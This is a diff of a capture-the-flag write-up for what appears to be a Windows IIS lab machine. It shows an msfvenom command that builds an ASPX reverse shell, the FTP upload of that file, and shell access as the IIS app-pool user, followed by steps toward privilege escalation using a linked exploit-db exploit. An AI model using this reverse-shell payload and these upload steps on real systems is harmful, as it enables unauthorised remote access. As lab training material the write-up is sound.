@@ -252,26 +252,72 @@ local\_exploit\_suggester
 Now, we can use msfvenom to generate an exploit to upload using ftp
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.75 LPORT=444 -f aspx > script.aspx
-Payload size: 324 bytes
-Final size of aspx file: 2745 bytes
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=444 -f aspx > exploit.aspx
+Payload size: 327 bytes
+Final size of aspx file: 2748 bytes
 ```
+
+LHOST is local ip, while, LPORT is the port that we'll use to connect by netcat.
 
 ```bash
-ftp> put exploit.aspx
-local: exploit.aspx remote: exploit.aspx
-229 Entering Extended Passive Mode (|||49325|)
+ftp> put script.aspx
+local: script.aspx remote: script.aspx
+229 Entering Extended Passive Mode (|||49224|)
 125 Data connection already open; Transfer starting.
-100% |***************************************************************************************|  2783       47.39 MiB/s    --:-- ETA
+100% |**************************************************************|  2748        1.12 MiB/s    --:-- ETA
 226 Transfer complete.
-2783 bytes sent in 00:00 (48.54 KiB/s)
+2748 bytes sent in 00:00 (45.20 KiB/s)
 ```
 
+Now we can launch netcat on port 444 and run script:
 
+<div align="left">
 
+<figure><img src=".gitbook/assets/Schermata del 2023-07-25 20-21-37.png" alt=""><figcaption></figcaption></figure>
 
+</div>
 
+```bash
+c:\Windows>whoami
+whoami
+iis apppool\web
+```
 
+We're iis apppool\web user, the flag maybe is on the babiis user's desktop
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-25 20-42-34.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+We've not access to babibs' directory, we can try to find "user.txt" flag using while command in C:\ root.
+
+```bash
+where /r C:\ user.txt
+```
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-25 20-45-43.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Nothing to do! Now, we need to privilege escalation and access on bibis' dir.
+
+We launch systeminfo command to know info about OS:
+
+```
+systeminfo
+```
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-25 21-33-57.png" alt=""><figcaption></figcaption></figure>
+
+OS Version: 6.1.7600 N/A Build 7600
+
+Searching on google we found this [exploit](https://www.exploit-db.com/exploits/40564) for OS vs.
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-25 21-35-56.png" alt=""><figcaption><p><a href="https://www.exploit-db.com/exploits/40564">https://www.exploit-db.com/exploits/40564</a></p></figcaption></figure>
 
 
 
